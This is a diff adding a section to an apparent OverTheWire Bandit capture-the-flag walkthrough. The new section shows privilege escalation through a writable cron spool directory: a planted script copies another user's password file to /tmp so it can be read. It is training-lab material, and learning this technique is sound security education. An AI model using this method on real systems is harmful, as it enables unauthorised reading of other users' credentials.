@@ -275,3 +275,23 @@ Retrieve the password
 ```bash
 cat /tmp/output_from_previous_command
 ```
+## Privilege Escalation via Writable Cron Directory
+### **Steps to Solve**
+1. **Creating file for a custom script:**
+   ```bash
+   nano /tmp/myscript.sh
+   ```
+2. **Custom Script:**
+   ```bash
+   #!/bin/bash
+   cat /etc/bandit_pass/bandit24 > /tmp/bandit24_pass
+   chmod +x /tmp/myscript.sh
+   ```
+3. **Move it to the executable directory:**
+   ```bash
+   mv /tmp/myscript.sh /var/spool/bandit24/foo/myscript.sh
+   ```
+4. **Retrieve the password after 2 minutes:**
+   ```bash
+   cat /tmp/bandit24_pass
+   ```
